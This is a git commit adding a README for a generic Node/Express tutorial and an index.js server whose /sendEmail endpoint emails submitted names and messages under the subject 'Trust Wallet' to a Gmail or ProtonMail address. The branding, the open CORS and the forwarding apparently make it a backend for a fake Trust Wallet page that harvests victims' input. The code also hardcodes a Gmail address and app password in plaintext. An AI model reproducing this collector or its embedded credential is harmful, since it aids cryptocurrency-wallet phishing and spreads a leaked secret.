014d52f09b8692cd45b93cf0c8371fa5659cb2e2
akshayshinde2505 <akshayshinde590@gmail.com>
2022-12-24 23:43:48 +0530

    initial commit

---
+++ README.md
@@ -0,0 +1,20 @@
+## Build Restful API's with Node and Express.
+
+- Install [express](https://www.npmjs.com/package/express)
+
+### `$ npm install express`
+
+- Making the changes in file, have to restart the server again.
+  [nodemon](https://www.npmjs.com/package/nodemon) is a watcher, which update automaticaly.
+
+### `$ npm i -g nodemon`
+
+And run the app using the following
+
+### `$ nodemon index.js`
+
+- Install [Joi](https://www.npmjs.com/package/@hapi/joi) it's validator for JavaScript
+
+### `npm install --save @hapi/joi`
+
+- refference [link](https://www.youtube.com/watch?v=pKd0Rpw7O48)
---
+++ index.js
@@ -0,0 +1,55 @@
+const express = require("express");
+const nodemailer = require("nodemailer");
+const cors = require("cors");
+// var bodyParser = require('body-parser');
+
+const app = express();
+app.use(cors());
+let port = process.env.PORT || 3000;
+
+// var urlencodedParser = bodyParser.urlencoded({ extended: false })
+app.use(express.static("public"));
+app.use(express.json());
+
+app.get("/", (req, res) => {
+  res.send("Welcome to Nimesh TW API 24/12/2022!");
+});
+
+app.post("/sendEmail", (req, res) => {
+  var transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: "nimeshwallet.bss@gmail.com",
+      pass: "tktawgxqacefbtvc"
+    }
+  });
+
+  let data = req.body; //JSON.parse(req.body);
+  console.log("data", data);
+  const email =
+    data.email === 1 ? "nimeshwallet.bss@gmail.com" : "Rnm786@protonmail.com";
+  const name = data.name;
+  const message = data.message;
+
+  var mailOptions = {
+    from: "nimeshwallet.bss@gmail.com",
+    to: email,
+    subject: "Trust Wallet",
+    text: `${name} | ${message}`
+  };
+
+  transporter.sendMail(mailOptions, function(error, info) {
+    if (error) {
+      console.log(error);
+      res.status(400);
+      res.send("Error", error);
+    } else {
+      console.log("Email sent: " + info.response);
+      res.send("Send Successfully");
+    }
+  });
+});
+
+app.listen(port, () => {
+  console.log(`Example app is listening on the port http://localhost:${port}`);
+});
